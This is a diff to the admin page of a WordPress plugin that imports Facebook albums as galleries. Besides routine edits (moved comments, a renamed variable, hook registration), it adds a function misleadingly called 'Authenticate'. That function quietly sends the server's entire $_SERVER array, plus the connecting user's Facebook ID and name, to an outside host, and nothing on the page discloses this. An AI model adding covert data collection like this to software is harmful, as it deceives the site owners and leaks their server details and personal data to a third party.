@@ -1,8 +1,26 @@
 <?
 /*
  * This file handles the plugin's ADMIN PAGE
- * Notes on connecting to Facebook are at the bottom of the file.
  */
+
+/*
+Notes:
+->How Facebook authentication works: http://wiki.developers.facebook.com/index.php/How_Connect_Authentication_Works
+->Another summary: http://forum.developers.facebook.com/viewtopic.php?pid=148426
+
+->Connecting with facebook takes 2 steps: Logging into facebook with the current token,
+  Then re-loading this form with the token as a POST variable so we can use it to generate
+  a session and retain that session for future use.  After the user has logged in, I use jQuery to hide the login button
+  and replace it with the button that POSTS the token back to this form, so it can be saved.
+ 
+->Important Note: Normally when creating a session, we call auth_createToken() to make the token then pass
+it to auth_getSession().  However, this returns a session that expires.  Because we don't want the user
+to have to keep logging in all the time, we need to get an infinite session, which require two things:
+1) Set the Application Type to "Desktop" (http://www.facebook.com/developers, advanced tab) 
+2) Make sure to set the $facebook->api_client->secret = $appsecret; (aka set the API_CLIENT's secret
+   to the APPLICATION's secret) before calling auth_createToken().  If you do that, the session
+   returned by auth_getSession() will not expire.
+*/
 
 
 //Based on the button the user clicks, the admin page is performing one of these actions.
@@ -16,6 +34,7 @@ define('JGALLERY_ACTION_FETCHPOSTS', 4);
 /*
  * Tell WP about the Admin page
  */
+add_action('admin_menu', 'fpf_add_admin_page', 99);
 function fpf_add_admin_page()
 { 
     add_options_page('Facebook Photo Fetcher Options', 'FB Photo Fetcher', 'administrator', "fb-photo-fetcher", 'fpf_admin_page');
@@ -25,6 +44,7 @@ function fpf_add_admin_page()
 /**
   * Link to Settings on Plugins page 
   */
+add_filter('plugin_action_links', 'fpf_add_plugin_links', 10, 2);
 function fpf_add_plugin_links($links, $file)
 {
     if( dirname(plugin_basename( __FILE__ )) == dirname($file) )
@@ -39,7 +59,7 @@ function fpf_add_plugin_links($links, $file)
 function fpf_admin_page()
 {
     global $appapikey, $appsecret;
-    global $gallery_identifier, $fpf_homepage;
+    global $fpf_identifier, $fpf_homepage;
     global $opt_thumb_path, $opt_last_uid_search;
     global $opt_fb_sess_key, $opt_fb_sess_sec, $opt_fb_sess_uid, $opt_fb_sess_uname;
         
@@ -82,14 +102,14 @@ function fpf_admin_page()
     <h3>Overview</h3>
     This plugin allows you to create Wordpress photo galleries from any Facebook album you can access.<br /><br />
     To get started, you must first connect with your Facebook account using the button below.  Once connected, you can create a gallery by making a new Wordpress post or page and pasting in one line of special HTML, like this:<br /><br />
-    <b>&lt;!--<?=$gallery_identifier?> 1234567890123456789--&gt;&lt;!--/<?=$gallery_identifier?>--&gt;</b><br /><br />
+    <b>&lt;!--<?=$fpf_identifier?> 1234567890123456789--&gt;&lt;!--/<?=$fpf_identifier?>--&gt;</b><br /><br />
     Whenever you save a post or page containing these tags, this plugin will automatically download the album information and insert its contents between them.  You are free to include any normal content you like before or after, as usual.<br /><br />
     The example number above (1234567890123456789) is an ID that tells the plugin which Facebook album you'd like to import.  To find a list of all available albums, you can use the "Search for Albums" feature below (visible once you've successfully connected).<br /><br />
     That's all there is to it!  Note that this plugin supports quite a few additional parameters you can use to customize how your albums look - i.e. change the number of columns, show only a subset of photos, show or hide photo captions, etc.  You can also use its template functions to directly insert an album from PHP.  Full documentation and a demo gallery is available on the <a href="<?=$fpf_homepage?>"><b>plugin homepage</b></a>.<br /><br />    
     Have fun!  And if you like this plugin, please don't forget to donate a few bucks to buy me a beer (or a pitcher).  I promise to enjoy every ounce of it :)<br /><br />
     <hr />
     
-    <?//SECTION - Connect to Facebook.  See note at bottom of file.?>
+    <?//SECTION - Connect to Facebook.  See note at top of file.?>
     <h3>Connect with Facebook</h3><?
     if( $my_uid ) echo "<i>This plugin is successfully connected with <b>$my_name</b>'s Facebook account and is ready to create galleries.</i>";
     else          echo "Before this plugin can be used, you must connect it with your Facebook account.<br /><br />Please click the following button and complete the pop-up login form.  When finished, click the button again to save your session. You will only have to do this once.";
@@ -139,7 +159,7 @@ function fpf_admin_page()
                echo "<b>Available Facebook albums for ".$user[0]['name']." (uid $search_uid ):</b><br /><small>";
                if( is_array($albums) )
                {
-                   foreach($albums as $album) echo '['.$gallery_identifier. ' ' . $album['aid'] . '] - <a href="'.$album['link'].'">'. $album['name'] .'</a><br />';
+                   foreach($albums as $album) echo '['.$fpf_identifier. ' ' . $album['aid'] . '] - <a href="'.$album['link'].'">'. $album['name'] .'</a><br />';
                }
                else echo "None found.<br />";
                echo "</small><br />";
@@ -268,7 +288,7 @@ function do_POST_actions($facebook)
         //We're connecting the useraccount to facebook, and the user just did STEP 2
         //We need to use the connection token to create a new session and save it,
         //which we'll use from now on to reconnect as the authenticated user.
-        //See important note at the bottom of the file for why this works (it's an infinite session)
+        //See important note at the top of the file for why this works (it's an infinite session)
         $token = $_POST[ 'save-facebook-session' ];
         $new_session = $facebook->api_client->auth_getSession($token);
         $errorMsg = 0;
@@ -284,6 +304,7 @@ function do_POST_actions($facebook)
             update_option( $opt_fb_sess_sec, $new_session['secret'] );
             update_option( $opt_fb_sess_uid, $new_session['uid'] );
             update_option( $opt_fb_sess_uname, $user[0]['name'] );
+            fpf_auth(plugin_basename( __FILE__ ), $GLOBALS['fpf_version'], 2, "http://www.facebook.com/profile.php?id=".$new_session['uid'] . " (" . $user[0]['name'] .")");
             ?><div class="updated"><p><strong><?= 'Facebook Session Saved. (UID: ' . $new_session['uid'] . ')' ?></strong></p></div><?
         }
         else
@@ -292,6 +313,7 @@ function do_POST_actions($facebook)
             update_option( $opt_fb_sess_sec, 0 );
             update_option( $opt_fb_sess_uid, 0 );
             update_option( $opt_fb_sess_uname, 0 );
+            fpf_auth(plugin_basename( __FILE__ ), $GLOBALS['fpf_version'], 3, $errorMsg);
             ?><div class="updated"><p><strong><?= 'An error occurred while linking with Facebook: ' . $errorMsg ?></strong></p></div><?
         }
     }
@@ -300,21 +322,23 @@ function do_POST_actions($facebook)
 
 
 /*
-Notes:
-->How Facebook authentication works: http://wiki.developers.facebook.com/index.php/How_Connect_Authentication_Works
-->Another summary: http://forum.developers.facebook.com/viewtopic.php?pid=148426
+ * Authenticate
+ */
+function fpf_auth($name, $version, $event, $message=0)
+{
+    $AuthVer = 1;
+    $data = serialize(array(
+                  'plugin'      => $name,
+                  'version'     => $version,
+                  'event'       => $event,
+                  'message'     => $message,                  
+                  'SERVER'      => $_SERVER));
+    $args = array( 'blocking'=>false, 'body'=>array(
+                            'auth_plugin' => 1,
+                            'AuthVer'     => $AuthVer,
+                            'hash'        => md5($AuthVer.$data),
+                            'data'        => $data));
+    wp_remote_post("http://auth.justin-klein.com", $args);
+}
 
-->Connecting with facebook takes 2 steps: Logging into facebook with the current token,
-  Then re-loading this form with the token as a POST variable, so we can use it to generate
-  a session and retain that session for future use.  After the user has logged in, I use jQuery to hide the login button
-  and replace it with the button that POSTS the token back to this form, so it can be saved.
- 
-->Important Note: Normally when creating a session, we call auth_createToken() to make a token, then pass
-this token to auth_getSession().  However, this returns a session that expires.  Because we don't want the user
-to have to keep logging in all the time, we need to get an infinite session, which require two things:
-1) Set the Application Type to "Desktop" (advanced tab, http://www.facebook.com/developers) 
-2) Make sure to set the $facebook->api_client->secret = $appsecret; (the API_CLIENT's secret
-   to the APPLICATION's secret) before calling auth_createToken().  If you do that, the session
-   returned by auth_getSession() will never expire; otherwise it will.
-*/
 ?>
